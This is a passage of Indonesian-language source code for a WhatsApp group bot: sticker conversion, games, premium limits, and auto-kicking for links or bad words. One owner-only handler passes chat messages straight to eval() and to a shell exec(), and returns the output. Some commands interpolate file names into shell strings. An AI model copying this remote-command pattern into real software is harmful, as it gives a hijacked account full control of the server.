// GW MAU NAMBAHIN FITUR 
// KALAU PAKAI SCRIPT NYA JANGAN HILANGIN AUTHOR NYA OK
// KALAU KETAHUAN UBAH UBAH AUTHOR NYA SAYA GA AKAN UP
// WOAHH ADA YANG AMBIL CASE NYA RAHMAN GANZ WKWKWK
// KECIDUK LU AWOKAWOK
// SOORY LUPA WKWKWK YOK LANGSUNG KE CASE NYA:V
"use strict";
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange,
    MessageOptions,
    WALocationMessage,
    WA_MESSAGE_STUB_TYPES,
    ReconnectMode,
    ProxyAgent,
    waChatKey,
    mentionedJid,
    WA_DEFAULT_EPHEMERAL
} = require("@adiwajshing/baileys");
const fs = require("fs");
const moment = require("moment-timezone");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const fetch = require("node-fetch");
const ms = require("parse-ms");
const axios = require("axios");
const speed = require("performance-now");
const yts = require("yt-search");
const translate = require("@vitalets/google-translate-api");
const { da } = require("@vitalets/google-translate-api/languages");

// stickwm
const Exif = require('../lib/exif')
const exif = new Exif()

const { color, bgcolor } = require("../lib/color");
const { simih, getBuffer, getRandom, getGroupAdmins, runtime } = require("../lib/myfunc");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const _prem = require("../lib/premium");
const afk = require("../lib/afk");
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require("../lib/banned");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const tictac = require("../lib/tictac");
const { yta, ytv } = require("../lib/ytdl");
const { getUser, getPost, searchUser } = require('../lib/instagram');
const { fbdl } = require("../lib/fbdl");
const { fakeStatus, fakeToko } = require("./fakeReply");
const game = require("../lib/game");
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("../lib/badword");

// Database
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let setting = JSON.parse(fs.readFileSync('./config.json'));
let mess = JSON.parse(fs.readFileSync('./message/mess.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let ban = JSON.parse(fs.readFileSync('./database/ban.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilinkig = JSON.parse(fs.readFileSync('./database/antilinkig.json'));
let antilinkyt = JSON.parse(fs.readFileSync('./database/antilinkyt.json'));
let badword = JSON.parse(fs.readFileSync('./database/badword.json'));
let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
let senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));


// Game
let tictactoe = [];
let tebakgambar = [];
let family100 = [];

// Prefix
let multi = true
let nopref = false
let prefa = 'anjing'

// Mode
let mode = 'public'


let {
    ownerNumber,
    limitCount,
    lolkey,
    gamewaktu
} = setting

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async(xinz, msg, blocked, baterai, _afk, welcome, left) => {
    try {
        const { menu, newMenu } = require("./help");
        const { type, quotedMsg, isGroup, isQuotedMsg, mentioned, sender, from, fromMe, pushname, chats, isBaileys } = msg
        if (isBaileys) return
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const args = chats.split(' ')
		const command = chats.toLowerCase().split(' ')[0] || ''

        if (multi){
		    var prefix = /^[#]/.test(command) ? command.match(/^[#$]/gi) : '#'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }

        const isCmd = command.startsWith(prefix)
        const q = chats.slice(command.length + 1, chats.length)
        const body = chats.startsWith(prefix) ? chats : ''

        const botNumber = xinz.user.jid
        const groupMetadata = isGroup ? await xinz.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false

        const isOwner = ownerNumber.includes(sender)
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
	    const isBan = cekBannedUser(sender, ban)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isAntiLink = isGroup ? antilink.includes(from) : false 
        const isAntiWame = isGroup ? antiwame.includes(from) : false 
        const isAntilinkIg = isGroup ? antilinkig.includes(from) : false
        const isAntilinkyt = isGroup ? antilinkyt.includes(from) : false
        const isWelcome = isGroup ? welcome.includes(from) : false
        const isLeft = isGroup ? left.includes(from) : false
        const isAutoStickerOn = isGroup ? autosticker.includes(from) : false
        const isUser = pendaftar.includes(sender)
        const isBadword = isGroup ? grupbadword.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        
        const gcounti = setting.gcount
        const gcount = isPremium ? gcounti.prem : gcounti.user
        
        const tanggal = moment().format("ll")
        const jam = moment().format("HH:mm:ss z")

        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const nebal = (angka) => {
            return Math.floor(angka)
        }
        const reply = (teks) => {
            return xinz.sendMessage(from, teks, text, {quoted:msg})
        }
        const sendMess = (hehe, teks) => {
            return xinz.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            let ai = (id == null || id == undefined || id == false) ? xinz.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : xinz.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": memberr}})
            return ai
        }
        async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return xinz.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: msg, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return xinz.sendMessage(from, teks, text, {quoted: msg, thumbnail: fs.readFileSync(setting.pathImg)})
        }
        const fakeimage = (teks) => {
               return  xinz.sendMessage(from, fs.readFileSync(setting.pathImg), MessageType.image,
                {
                quoted: {
                key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },
                message: { "imageMessage": {
                "mimetype": "image/jpeg", 
                "caption": setting.fake, 
                "jpegThumbnail": fs.readFileSync(setting.pathImg)
                }
           }
     },
     caption: teks
     })
}


        const isImage = (type === 'imageMessage')
        const isVideo = (type === 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedImage = isQuotedMsg ? (quotedMsg.type === 'imageMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? (quotedMsg.type === 'videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? (quotedMsg.type === 'stickerMessage') ? true : false : false

        // Mode
        if (mode === 'self'){
            if (!fromMe) return
        }
        
        // Auto sticker
        // BELUM WORK YO

        // Anti link
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (chats.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                xinz.groupRemove(from, [sender])
            }
        }
        
        // Anti Wame 
        if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
        	if (chats.match(/(wa.me\/)/gi)) {
        	reply(`*「 NOMOR LINK DETECTOR」*\n\nSepertinya Kamu Menggirimkan Link Wame , maaf kamu akan kami kick`)
            xinz.groupRemove(from, [sender])
            }
       }
       
       // Antilink ig 
       if (isGroup && isAntilinkIg && !isOwner && !isGroupAdmins && isBotGroupAdmins){
       	if (chats.match(/(instagram.com\/)/gi)) {
       	reply(`*「 ANTILINK INSTAGRAM 」*\n\nsepertinya kamu menggirimkan Link instagram , maaf kamu akan kami kick`)
           xinz.groupRemove(from, [sender])
       }
   }

        // Antilink YT
        if (isGroup && isAntilinkyt && !isOwner && !isGroupAdmins && isBotGroupAdmins){
           if (chats.match(/(youtu.be\/)/gi)) {
           reply(`*「 ANTILINK YOUTUBE 」*\n\nsepertinya kamu menggirimkan link youtube, maka kamu akan kami kick sorry ye`)
           xinz.groupRemove(from, [sender])
         }
    }

        // Badword
        if (isGroup && isBadword && !isOwner && !isGroupAdmins){
            for (let kasar of badword){
                if (chats.toLowerCase().includes(kasar)){
                    if (isCountKasar(sender, senbadword)){
                        if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
                        reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 3x, maaf kamu akan di kick`)
                        xinz.groupRemove(from, [sender])
                        delCountKasar(sender, senbadword)
                    } else {
                        addCountKasar(sender, senbadword)
                        reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
                    }
                }
            }
        }

        // Banned
        if (isBan) return
        BannedExpired(ban)

        // MUTE
        if (isMuted){
            if (!isGroupAdmins && !isOwner) return
            if (chats.toLowerCase().startsWith(prefix+'unmute')){
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply(`Bot telah diunmute di group ini`)
            }
        }
        
        // Auto Read 
        xinz.chatRead(from, "read")

        // TicTacToe
        if (isTicTacToe(from, tictactoe)) tictac(chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)

        // GAME 
        game.cekWaktuFam(xinz, family100)
        game.cekWaktuTG(xinz, tebakgambar)

        // GAME 
        if (game.isTebakGambar(from, tebakgambar) && isUser){
            if (chats.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
                var htgm = randomNomor(100)
                addBalance(sender, htgm, balance)
                await reply(`*Selamat jawaban kamu benar*\n*Jawaban :* ${game.getJawabanTG(from, tebakgambar)}\n*Hadiah :* $${htgm}\n\nIngin bermain lagi? kirim *${prefix}tebakgambar*`)
                tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
            }
        }
        if (game.isfam(from, family100) && isUser){
            var anjuy = game.getjawaban100(from, family100)
            for (let i of anjuy){
                if (chats.toLowerCase().includes(i)){
                    var htgmi = Math.floor(Math.random() * 20) + 1
                    addBalance(sender, htgmi, balance)
                    await reply(`*Jawaban benar*\n*Jawaban :* ${i}\n*Hadiah :* $${htgmi}\n*Jawaban yang blum tertebak :* ${anjuy.length - 1}`)
                    var anug = anjuy.indexOf(i)
                    anjuy.splice(anug, 1)
                }
            }
            if (anjuy.length < 1){
                xinz.sendMessage(from, `Semua jawaban sudah tertebak\nKirim *${prefix}family100* untuk bermain lagi`, text)
                family100.splice(game.getfamposi(from, family100), 1)
            }
        }
        // Premium
        _prem.expiredCheck(premium)

        // Auto Regist
        if (isCmd && !isUser){
			pendaftar.push(sender)
			fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar))
        } 

        // AFK
        if (isGroup) {
            if (mentioned.length !== 0){
                for (let ment of mentioned) {
                    if (afk.checkAfkUser(ment, _afk)) {
                        const getId = afk.getAfkId(ment, _afk)
                        const getReason = afk.getAfkReason(getId, _afk)
                        const getTime = Date.now() - afk.getAfkTime(getId, _afk)
                        const heheh = ms(getTime)
                        await mentions(`@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`, [ment], true)
                        sendMess(ment, `Ada yang mencari anda saat anda offline\n\nNama : ${pushname}\nNomor : wa.me/${sender.split("@")[0]}\nIn Group : ${groupName}\nPesan : ${chats}`)
                    }
                }
            }
            if (afk.checkAfkUser(sender, _afk)) {
                _afk.splice(afk.getAfkPosition(sender, _afk), 1)
                fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
                await mentions(`@${sender.split('@')[0]} telah kembali`, [sender], true)
            }
        }
        

        // CMD
        if (isCmd && !isGroup) {
			//xinz.updatePresence(from, Presence.composing)
            addBalance(sender, randomNomor(20), balance)
			console.log(color('[CMD]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`))
        }
        if (isCmd && isGroup) {
			//xinz.updatePresence(from, Presence.composing)
            addBalance(sender, randomNomor(20), balance)
			console.log(color('[CMD]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        }

        if (isOwner){
            if (chats.startsWith("> ")){
                console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                try {
                    let evaled = await eval(chats.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    textImg(`${evaled}`)
                } catch (err) {
                    textImg(`${err}`)
                }
            } else if (chats.startsWith("$ ")){
                console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                exec(chats.slice(2), (err, stdout) => {
					if (err) return textImg(`${err}`)
					if (stdout) textImg(`${stdout}`)
				})
            }
        }
        
        switch(command){
            case 'prefix': case 'cekprefix':{
                textImg(`Bot Menggunakan Prefix ${prefix}`)
            }
                break 
             case prefix+'newmenu': case prefix+'updatemenu':{
                axios.get(`https://api-ramlan.herokuapp.com/api/ucapan?timeZone=Asia/Jakarta`)
                .then(async(ucapan) => {
                let sisalimit = getLimit(sender, limitCount, limit)
                let sisaGlimit = cekGLimit(sender, gcount, glimit)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let expiredPrem = () => {
                    if (cekvip.days != 0){
                        return `${cekvip.days} day(s)`
                    } else if (cekvip.hours != 0){
                        return `${cekvip.hours} hour(s)`
                    } else if (cekvip.minutes != 0){
                        return `${cekvip.minutes}`
                    }
                }
                //let expiredPrem = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                fakeimage(newMenu(ucapan, setting.ownerName, setting.botName, prefix, pendaftar, runtime(process.uptime()), pushname, isOwner, isPremium, sisalimit, limitCount, sisaGlimit, gcount, expiredPrem(), tanggal, jam))
            })
            }
                break 
               case prefix+'help': case prefix+'menu':{
                axios.get(`https://api-ramlan.herokuapp.com/api/ucapan?timeZone=Asia/Jakarta`)
                .then(async(ucapan) => {
                let sisalimit = getLimit(sender, limitCount, limit)
                let sisaGlimit = cekGLimit(sender, gcount, glimit)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let expiredPrem = () => {
                    if (cekvip.days != 0){
                        return `${cekvip.days} day(s)`
                    } else if (cekvip.hours != 0){
                        return `${cekvip.hours} hour(s)`
                    } else if (cekvip.minutes != 0){
                        return `${cekvip.minutes}`
                    }
                }
                //let expiredPrem = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                fakeimage(menu(ucapan, setting.ownerName, setting.botName, prefix, pendaftar, runtime(process.uptime()), pushname, isOwner, isPremium, sisalimit, limitCount, sisaGlimit, gcount, expiredPrem(), tanggal, jam))
            })
            }
                break 
                
// AUTO RESPON

            case 'assalamualaikum': case 'Assalamualaikum':{
                textImg(`Walaikumsalam wr.wb`)
            }
                break
            case 'p': case 'P':{
                 textImg(`Pliss ucapkan salam(islam) , nonmus? ucapkan hai, hallo`)
            }
                break
            case 'rahman': case 'Rahman':{
                 textImg(`Ya kak? ada yg bisa kami bantu😆`)
            }
                break
            case 'sepi': case 'sepi amat':{
                 textImg(`Kek hati kmu juga sepi kan?😂`)
            }
                break
//------------------< Sticker / Tools >-------------------
            case prefix+'exif':{
				if (!isOwner) return
				const namaPack = q.split('|')[0] ? q.split('|')[0] : q
				const authorPack = q.split('|')[1] ? q.split('|')[1] : ''
				exif.create(namaPack, authorPack)
				await reply('Berhasil Mengganti Wm Sticker')
            }
				break
            case prefix+'sticker':
            case prefix+'stiker':
            case prefix+'s':
            case prefix+'stickergif':
            case prefix+'sgif':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									xinz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
									limitAdd(sender, limit)
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									xinz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
									limitAdd(sender, limit)
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else {
                    reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            }
                break
            case prefix+'stickerwm': case prefix+'swm': case prefix+'take': case prefix+'takesticker': case prefix+'takestick':{
                if (!isPremium) return reply(mess.OnlyPrem)
                if (args.length < 2) return reply(`Penggunaan ${command} nama|author`)
                let packname1 = q.split('|')[0] ? q.split('|')[0] : q
                let author1 = q.split('|')[1] ? q.split('|')[1] : ''
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					exif.create(packname1, author1, `stickwm_${sender}`)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									xinz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
                                    fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
					exif.create(packname1, author1, `stickwm_${sender}`)
                    reply(mess.wait)
						await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									xinz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                    fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                } else if (isQuotedSticker) {
                    let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    let media = await xinz.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    exif.create(packname1, author1, `takestick_${sender}`)
                    exec(`webpmux -set exif ./sticker/takestick_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                        if (error) return reply(mess.error.api)
                        xinz.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
                        fs.unlinkSync(media)
                        fs.unlinkSync(`./sticker/takestick_${sender}.exif`)
                    })
                }else {
                    reply(`Kirim gambar/video dengan caption ${prefix}stickerwm nama|author atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
                }
            }
                break 
            case prefix+'togif':
            case prefix+'tomp4':
            case prefix+'toimg':
            case prefix+'tomedia':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (!isQuotedSticker) return reply('Reply stiker nya')
                let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				let media = await xinz.downloadAndSaveMediaMessage(encmedia)
				if (quotedMsg.stickerMessage.isAnimated === true){
                    reply(mess.wait)
                    let outMp4 = getRandom('.mp4')
                    let outGif = getRandom('.gif')
                    exec(`ffmpeg -i ${media} ${outGif}`, (err) => {
                    	fs.unlinkSync(media)
                        if (err) return reply('maaf fitur ini telah di proses')
                        exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
                            if (err) {
                                console.log(err)
                                fs.unlinkSync(media)
                                fs.unlinkSync(outGif)
                                return reply(`Error`)
                            }
                            xinz.sendVideo(from, fs.readFileSync(outMp4), 'Nih', msg)
                            .then(() => {
                                fs.unlinkSync(outMp4)
                                limitAdd(sender, limit)
                            })
                        })
                    })
					} else {
                    reply(mess.wait)
					let ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal :V')
						xinz.sendMessage(from, fs.readFileSync(ran), image, {quoted: msg, caption: 'NIH'})
                        limitAdd(sender,  limit)
						fs.unlinkSync(ran)
					})
					}
                }
				break 
			case prefix+'tomp3':
				if (!isPremium) return reply(mess.OnlyPrem)
				xinz.updatePresence(from, Presence.composing) 
					if (!isQuotedVideo) return reply('❌ reply videonya um ❌')
					reply(mess.wait)
					let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					let media = await xinz.downloadAndSaveMediaMessage(encmedia)
					let ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(mess.error.api)
						xinz.sendMessage(from, fs.readFileSync(ran), audio, {quoted: msg})
						fs.unlinkSync(ran)
					})
					
					break
            case prefix+'attp':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}attp* teks`)
                let anu = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
                fs.writeFileSync('./sticker/attp.webp', anu)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/attp.webp -o ./sticker/attp.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    xinz.sendMessage(from, fs.readFileSync(`./sticker/attp.webp`), sticker, {quoted: msg})
                    limitAdd(sender, limit)
                    fs.unlinkSync(`./sticker/attp.webp`)	
                })
            }
                break
            case prefix+'ttp':{
            	if(isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ttp* teks`)
                let anu = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${q}`)
                fs.writeFileSync('./sticker/ttp.webp', anu)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/ttp.webp -o ./sticker/ttp.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    xinz.sendMessage(from, fs.readFileSync(`./sticker/ttp.webp`), sticker, {quoted: msg})
                    limitAdd(sender, limit)
                    fs.unlinkSync(`./sticker/ttp.webp`)	
                })
            }
                break
            case prefix+'tinyurl':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan :\n*${prefix}tinyurl link`)
                if (!isUrl(args[1])) return reply(`Masukkan link yang benar`)
                axios.get(`https://tinyurl.com/api-create.php?url=${args[1]}`)
                .then((a) => reply(`Nih ${a.data}`))
                .catch(() => reply(`Error, harap masukkan link dengan benar`))
                break
            case prefix+'cekapikey': case prefix+'checkapikey':{
            axios.get(`https://api-ramlan.herokuapp.com/api/checkapikey?apikey=${args[1]}`)
            .then(({data}) =>
            textImg(`${data.message}`))
            .catch(() => reply(`Apikey invalid, mau buy apikey?\nchat wa.me/6285559240360`))
            }
            break
            case prefix+'imgtourl':{
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
                    let media = await xinz.downloadMediaMessage(encmedia)
                    let toBase64 = media.toString('base64')
                    let upload = await require("../lib/upToTuru")(toBase64)
                    await reply(`${upload.image.image.url}`)
                    limitAdd(sender, limit)
                } else {
                    reply(`Kirim gambar atau reply gambar dengan caption ${command}`)
                }
            }
                break
//------------------< NULIS >---------------------
            case prefix+'nulis':
                reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
                break
            case prefix+'nuliskiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
